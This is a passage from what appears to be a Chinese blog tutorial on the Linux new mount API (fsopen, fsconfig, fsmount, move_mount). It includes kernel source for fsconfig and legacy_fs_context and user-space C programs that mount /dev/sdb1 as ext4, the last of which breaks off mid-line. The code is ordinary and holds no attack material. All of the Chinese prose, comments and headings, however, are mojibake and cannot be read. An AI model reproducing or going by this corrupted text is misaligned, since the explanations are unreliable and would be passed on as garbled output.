class="hljs-keyword">if</span> (!init_fs_context)<br>init_fs_context = legacy_init_fs_context;<br><br><span class="hljs-comment">// åˆå§‹åŒ– fs_context</span><br>ret = init_fs_context(fc);<br><span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">goto</span> err_fc;<br>fc-&gt;need_free = <span class="hljs-literal">true</span>;<br><span class="hljs-keyword">return</span> fc;<br><br>err_fc:<br>put_fs_context(fc);<br><span class="hljs-keyword">return</span> ERR_PTR(ret);<br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨å®Œæˆäº†é€šç”¨çš„åˆå§‹åŒ–å·¥ä½œåï¼Œæœ€ç»ˆè¿›è¡Œå…·ä½“æ–‡ä»¶ç³»ç»Ÿå¯¹åº”åˆå§‹åŒ–å·¥ä½œçš„å…¶å®æ˜¯è°ƒç”¨ <code>file_system_type</code> ä¸­çš„ <code>init_fs_context</code> å‡½æ•°æŒ‡é’ˆå¯¹åº”çš„å‡½æ•°å®Œæˆçš„ï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å¯¹äºæœªè®¾ç½® <code>init_fs_context</code> çš„æ–‡ä»¶ç³»ç»Ÿç±»å‹è€Œè¨€å…¶æœ€ç»ˆä¼šè°ƒç”¨ <code>legacy_init_fs_context()</code> è¿›è¡Œåˆå§‹åŒ–ï¼Œä¸»è¦å°±æ˜¯ä¸º <code>fs_context-&gt;fs_private</code> åˆ†é…ä¸€ä¸ª <code>legacy_fs_context</code> ç»“æ„ä½“ï¼Œå¹¶å°† <code>fs_context</code> çš„å‡½æ•°è¡¨è®¾ç½®ä¸º <code>legacy_fs_context_ops</code>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">legacy_init_fs_context</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> fs_context *fc)</span><br>&#123;<br>fc-&gt;fs_private = kzalloc(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> legacy_fs_context), GFP_KERNEL);<br><span class="hljs-keyword">if</span> (!fc-&gt;fs_private)<br><span class="hljs-keyword">return</span> -ENOMEM;<br>fc-&gt;ops = &amp;legacy_fs_context_ops;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p> <code>legacy_fs_context</code> ç»“æ„ä½“çš„å®šä¹‰å¦‚ä¸‹ï¼Œæ ‡è¯†äº†ä¸€å—æŒ‡å®šé•¿åº¦ä¸ç±»å‹çš„ç¼“å†²åŒºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">legacy_fs_context</span> &#123;</span><br><span class="hljs-type">char</span>*legacy_data;<span class="hljs-comment">/* Data page for legacy filesystems */</span><br><span class="hljs-type">size_t</span>data_size;<br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">legacy_fs_param</span><span class="hljs-title">param_type</span>;</span><br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="Step-II-fsconfig-è®¾ç½®-filesystem-context-çš„ç›¸å…³å‚æ•°ä¸æ“ä½œ"><a href="#Step-II-fsconfig-è®¾ç½®-filesystem-context-çš„ç›¸å…³å‚æ•°ä¸æ“ä½œ" class="headerlink" title="Step.II - fsconfig: è®¾ç½® filesystem context çš„ç›¸å…³å‚æ•°ä¸æ“ä½œ"></a>Step.II - fsconfig: è®¾ç½® filesystem context çš„ç›¸å…³å‚æ•°ä¸æ“ä½œ</h3><p>åœ¨å®Œæˆäº†ç©ºç™½çš„æ–‡ä»¶ç³»ç»Ÿä¸Šä¸‹æ–‡çš„åˆ›å»ºä¹‹åï¼Œæˆ‘ä»¬è¿˜éœ€è¦å¯¹å…¶è¿›è¡Œç›¸åº”çš„é…ç½®ï¼Œä»¥ä¾¿äºåç»­çš„æŒ‚è½½æ“ä½œï¼Œè¿™ä¸ªé…ç½®çš„åŠŸèƒ½å¯¹åº”åˆ°çš„å°±æ˜¯ <code>fsconfig()</code> ç³»ç»Ÿè°ƒç”¨</p><p> <code>fsconfig()</code> ç³»ç»Ÿè°ƒç”¨æ ¹æ®ä¸åŒçš„ cmd è¿›è¡Œä¸åŒçš„æ“ä½œï¼Œå¯¹äºæŒ‚è½½æ–‡ä»¶ç³»ç»Ÿè€Œè¨€å…¶æ ¸å¿ƒæ“ä½œä¸»è¦å°±æ˜¯ä¸¤ä¸ª cmdï¼š</p><ul><li><code>FSCONFIG_SET_STRING</code> ï¼šè®¾ç½®ä¸åŒçš„é”®å€¼å¯¹å‚æ•°</li><li><code>FSCONFIG_CMD_CREATE</code>ï¼šè·å¾—ä¸€ä¸ª superblock å¹¶åˆ›å»ºä¸€ä¸ª root entry</li></ul><p>ç¤ºä¾‹ç”¨æ³•å¦‚ä¸‹æ‰€ç¤ºï¼Œè¿™é‡Œåˆ›å»ºäº†ä¸€ä¸ªé”®å€¼å¯¹ <code>&quot;source&quot;=/dev/sdb1</code> è¡¨ç¤ºæ–‡ä»¶ç³»ç»Ÿæºæ‰€åœ¨çš„è®¾å¤‡åï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/mount.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsopen</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsopen 430</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsconfig</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsconfig 431</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">fsopen</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *fs_name, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_fsopen, fs_name, flags);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">fsconfig</span><span class="hljs-params">(<span class="hljs-type">int</span> fsfd, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *key, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *val, <span class="hljs-type">int</span> aux)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_fsconfig, fsfd, cmd, key, val, aux);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-type">int</span> fs_fd;<br>    <br>    fs_fd = fsopen(<span class="hljs-string">&quot;ext4&quot;</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (fs_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[x] FAILED to fsopen!&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Successfully get an ext4 filesystem context descriptor:%d\n&quot;</span>, fs_fd);<br><br>    fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;source&quot;</span>, <span class="hljs-string">&quot;/dev/sdb1&quot;</span>, <span class="hljs-number">0</span>);<br>    fsconfig(fs_fd, FSCONFIG_CMD_CREATE, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="âœ³-fsconfig-in-kernel"><a href="#âœ³-fsconfig-in-kernel" class="headerlink" title="âœ³ fsconfig() in kernel"></a>âœ³ fsconfig() in kernel</h4><p>å†…æ ¸ç©ºé—´ä¸­çš„ <code>fsconfig()</code> å®ç°æ¯”è¾ƒé•¿ï¼Œä½†ä¸»è¦å°±æ˜¯æ ¹æ® cmd è¿›è¡Œå„ç§ switchï¼Œè¿™é‡Œå°±ä¸è´´å®Œæ•´çš„æºç äº†ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><code class="hljs c">SYSCALL_DEFINE5(fsconfig,<br><span class="hljs-type">int</span>, fd,<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>, cmd,<br><span class="hljs-type">const</span> <span class="hljs-type">char</span> __user *, _key,<br><span class="hljs-type">const</span> <span class="hljs-type">void</span> __user *, _value,<br><span class="hljs-type">int</span>, aux)<br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fs_context</span> *<span class="hljs-title">fc</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fd</span> <span class="hljs-title">f</span>;</span><br><span class="hljs-type">int</span> ret;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fs_parameter</span> <span class="hljs-title">param</span> =</span> &#123;<br>.type= fs_value_is_undefined,<br>&#125;;<br><br><span class="hljs-keyword">if</span> (fd &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">return</span> -EINVAL;<br><br><span class="hljs-keyword">switch</span> (cmd) &#123;<br><span class="hljs-keyword">case</span> FSCONFIG_SET_FLAG:<br><span class="hljs-comment">// ä¸»è¦æ˜¯å‚æ•°çš„å„ç§æ£€æŸ¥</span><br><span class="hljs-comment">// ...</span><br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">return</span> -EOPNOTSUPP;<br>&#125;<br><br><span class="hljs-comment">// è·å–æ–‡ä»¶æè¿°ç¬¦</span><br>f = fdget(fd);<br><span class="hljs-keyword">if</span> (!f.file)<br><span class="hljs-keyword">return</span> -EBADF;<br>ret = -EINVAL;<br><span class="hljs-keyword">if</span> (f.file-&gt;f_op != &amp;fscontext_fops)<br><span class="hljs-keyword">goto</span> out_f;<br><br><span class="hljs-comment">// è·å– fs_contextï¼Œå­˜å‚¨åœ¨æ–‡ä»¶æè¿°ç¬¦çš„ private_data å­—æ®µ</span><br>fc = f.file-&gt;private_data;<br><span class="hljs-keyword">if</span> (fc-&gt;ops == &amp;legacy_fs_context_ops) &#123;<br><span class="hljs-keyword">switch</span> (cmd) &#123; <span class="hljs-comment">// ä¸€ä¸ªæ“ä½œéƒ½æ²¡å®ç°</span><br><span class="hljs-keyword">case</span> FSCONFIG_SET_BINARY:<br><span class="hljs-keyword">case</span> FSCONFIG_SET_PATH:<br><span class="hljs-keyword">case</span> FSCONFIG_SET_PATH_EMPTY:<br><span class="hljs-keyword">case</span> FSCONFIG_SET_FD:<br>ret = -EOPNOTSUPP;<br><span class="hljs-keyword">goto</span> out_f;<br>&#125;<br>&#125;<br><br><span class="hljs-comment">// æ‹·è´ key å­—æ®µåˆ°å†…æ ¸ç©ºé—´</span><br><span class="hljs-keyword">if</span> (_key) &#123;<br>param.key = strndup_user(_key, <span class="hljs-number">256</span>);<br><span class="hljs-keyword">if</span> (IS_ERR(param.key)) &#123;<br>ret = PTR_ERR(param.key);<br><span class="hljs-keyword">goto</span> out_f;<br>&#125;<br>&#125;<br><br><span class="hljs-comment">// æ ¹æ®ä¸åŒçš„ cmd è¿›è¡Œ param çš„ä¸åŒè®¾ç½®</span><br><span class="hljs-keyword">switch</span> (cmd) &#123;<br><span class="hljs-comment">// ...</span><br><span class="hljs-comment">// æˆ‘ä»¬ä¸»è¦å…³æ³¨è¿™ä¸ª cmd</span><br><span class="hljs-keyword">case</span> FSCONFIG_SET_STRING:<br>param.type = fs_value_is_string;<br>param.<span class="hljs-built_in">string</span> = strndup_user(_value, <span class="hljs-number">256</span>);<br><span class="hljs-keyword">if</span> (IS_ERR(param.<span class="hljs-built_in">string</span>)) &#123;<br>ret = PTR_ERR(param.<span class="hljs-built_in">string</span>);<br><span class="hljs-keyword">goto</span> out_key;<br>&#125;<br>param.size = <span class="hljs-built_in">strlen</span>(param.<span class="hljs-built_in">string</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-comment">// ...</span><br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br>ret = mutex_lock_interruptible(&amp;fc-&gt;uapi_mutex);<br><span class="hljs-keyword">if</span> (ret == <span class="hljs-number">0</span>) &#123; <span class="hljs-comment">// æ ¹æ®å‰é¢è®¾ç½®çš„ param è¿›è¡Œ VFS ç›¸å…³æ“ä½œ</span><br>ret = vfs_fsconfig_locked(fc, cmd, &amp;param);<br>mutex_unlock(&amp;fc-&gt;uapi_mutex);<br>&#125;<br><br><span class="hljs-comment">/* Clean up the our record of any value that we obtained from</span><br><span class="hljs-comment"> * userspace.  Note that the value may have been stolen by the LSM or</span><br><span class="hljs-comment"> * filesystem, in which case the value pointer will have been cleared.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">switch</span> (cmd) &#123;<br><span class="hljs-keyword">case</span> FSCONFIG_SET_STRING:<br><span class="hljs-comment">// ä¸´æ—¶æ•°æ®æ¸…ç†å·¥ä½œ</span><br><span class="hljs-comment">//...</span><br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">break</span>;<br>&#125;<br>out_key:<br>kfree(param.key);<br>out_f:<br>fdput(f);<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><p>è€Œ <code>fsconfig()</code> çš„æ ¸å¿ƒä½œç”¨ä¸»è¦è¿˜æ˜¯æ ¹æ® cmd è¿›è¡Œå‚æ•°çš„å°è£…ï¼Œæœ€åè¿›å…¥åˆ° VFS ä¸­çš„æ“ä½œåˆ™é€šè¿‡ <code>vfs_fsconfig_locked()</code> å®Œæˆ</p><h3 id="Step-III-fsmount-è·å–ä¸€ä¸ªæŒ‚è½½å®ä¾‹"><a href="#Step-III-fsmount-è·å–ä¸€ä¸ªæŒ‚è½½å®ä¾‹" class="headerlink" title="Step.III - fsmount: è·å–ä¸€ä¸ªæŒ‚è½½å®ä¾‹"></a>Step.III - fsmount: è·å–ä¸€ä¸ªæŒ‚è½½å®ä¾‹</h3><p>å®Œæˆäº†æ–‡ä»¶ç³»ç»Ÿä¸Šä¸‹æ–‡çš„åˆ›å»ºä¸é…ç½®ï¼Œæ¥ä¸‹æ¥ç»ˆäºæ¥åˆ°æ–‡ä»¶ç³»ç»Ÿçš„æŒ‚è½½æ“ä½œäº†ï¼Œ<code>fsmount()</code> ç³»ç»Ÿè°ƒç”¨ç”¨ä»¥è·å–ä¸€ä¸ªå¯ä»¥è¢«ç”¨ä»¥è¿›è¡ŒæŒ‚è½½çš„æŒ‚è½½å®ä¾‹ï¼Œå¹¶è¿”å›ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦ç”¨ä»¥ä¸‹ä¸€æ­¥çš„æŒ‚è½½</p><p>ç¤ºä¾‹ç”¨æ³•å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/mount.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsopen</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsopen 430</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsconfig</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsconfig 431</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsmount</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsmount 432</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">fsopen</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *fs_name, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_fsopen, fs_name, flags);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">fsconfig</span><span class="hljs-params">(<span class="hljs-type">int</span> fsfd, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *key, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *val, <span class="hljs-type">int</span> aux)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_fsconfig, fsfd, cmd, key, val, aux);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">fsmount</span><span class="hljs-params">(<span class="hljs-type">int</span> fsfd, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> ms_flags)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_fsmount, fsfd, flags, ms_flags);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-type">int</span> fs_fd, mount_fd;<br>    <br>    fs_fd = fsopen(<span class="hljs-string">&quot;ext4&quot;</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (fs_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[x] FAILED to fsopen!&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Successfully get an ext4 filesystem context descriptor:%d\n&quot;</span>, fs_fd);<br><br>    fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;source&quot;</span>, <span class="hljs-string">&quot;/dev/sdb1&quot;</span>, <span class="hljs-number">0</span>);<br>    fsconfig(fs_fd, FSCONFIG_CMD_CREATE, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);<br><br>    mount_fd = fsmount(fs_fd, FSMOUNT_CLOEXEC, MOUNT_ATTR_RELATIME);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Step-IV-move-mount-å°†æŒ‚è½½å®ä¾‹åœ¨æŒ‚è½½ç‚¹é—´ç§»åŠ¨"><a href="#Step-IV-move-mount-å°†æŒ‚è½½å®ä¾‹åœ¨æŒ‚è½½ç‚¹é—´ç§»åŠ¨" class="headerlink" title="Step.IV - move_mount: å°†æŒ‚è½½å®ä¾‹åœ¨æŒ‚è½½ç‚¹é—´ç§»åŠ¨"></a>Step.IV - move_mount: å°†æŒ‚è½½å®ä¾‹åœ¨æŒ‚è½½ç‚¹é—´ç§»åŠ¨</h3><p>æœ€åæ¥åˆ°<del>ä¸€ä¸ªä¸ç»Ÿä¸€ä»¥ fs å¼€å¤´è¿›è¡Œå‘½åçš„</del> <code>move_mount()</code> ç³»ç»Ÿè°ƒç”¨ï¼Œå…¶ç”¨ä»¥å°†æŒ‚è½½å®ä¾‹åœ¨æŒ‚è½½ç‚¹é—´ç§»åŠ¨ï¼š</p><ul><li>å¯¹äºå°šæœªè¿›è¡ŒæŒ‚è½½çš„æŒ‚è½½å®ä¾‹è€Œè¨€ï¼Œè¿›è¡ŒæŒ‚è½½çš„æ“ä½œä¾¿æ˜¯ä»ç©ºæŒ‚è½½ç‚¹ <code>&quot;&quot;</code> ç§»åŠ¨åˆ°å¯¹åº”çš„æŒ‚è½½ç‚¹ï¼ˆä¾‹å¦‚ <code>&quot;/mnt/temp&quot;</code>ï¼‰ï¼Œæ­¤æ—¶æˆ‘ä»¬å¹¶ä¸éœ€è¦ç»™å‡ºç›®çš„æŒ‚è½½ç‚¹çš„ fdï¼Œè€Œå¯ä»¥ä½¿ç”¨ <code>AT_FDCWD</code></li></ul><p>å¼•å…¥äº† <code>move_mount()</code> ä¹‹åï¼Œæˆ‘ä»¬æœ€ç»ˆçš„ä¸€ä¸ªç”¨ä»¥å°† <code>&quot;/dev/sdb1&quot;</code> ä»¥ <code>&quot;ext4&quot;</code> æ–‡ä»¶ç³»ç»ŸæŒ‚è½½åˆ° <code>&quot;/mnt/temp&quot;</code> çš„å®Œæ•´ç¤ºä¾‹ç¨‹åºå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/mount.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsopen</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsopen 430</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsconfig</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsconfig 431</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsmount</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsmount 432</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_move_mount</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_move_mount 429</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">fsopen</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *fs_name, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_fsopen, fs_name, flags);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">fsconfig</span><span class="hljs-params">(<span class="hljs-type">int</span> fsfd, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, <span class="hljs-type">const</span> <span 